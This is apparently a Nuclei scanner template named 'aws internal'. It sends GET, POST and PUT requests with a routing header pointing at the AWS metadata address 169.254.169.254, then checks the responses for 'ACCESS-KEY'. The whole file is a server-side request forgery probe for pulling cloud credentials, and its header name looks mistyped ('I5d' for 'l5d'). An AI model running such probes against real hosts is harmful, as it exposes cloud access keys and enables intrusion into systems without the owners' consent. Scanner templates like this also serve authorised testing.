id: aws
info:
  author: MR.iambatman
  description: aws-find
  name: aws internal
  severity: high
requests:
- matchers:
  - type: word
    words:
    - latest
    - ACCESS-KEY
    - aws
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

    I5d-dtab: /$/inet/169.254.169.254/80

    Content-length: 100

    '
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

    I5d-dtab: /$/inet/169.254.169.254/80

    Content-length: 100

    '
  - 'PUT / HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

    I5d-dtab: /$/inet/169.254.169.254/80

    Content-length: 100

    '
  redirects: true
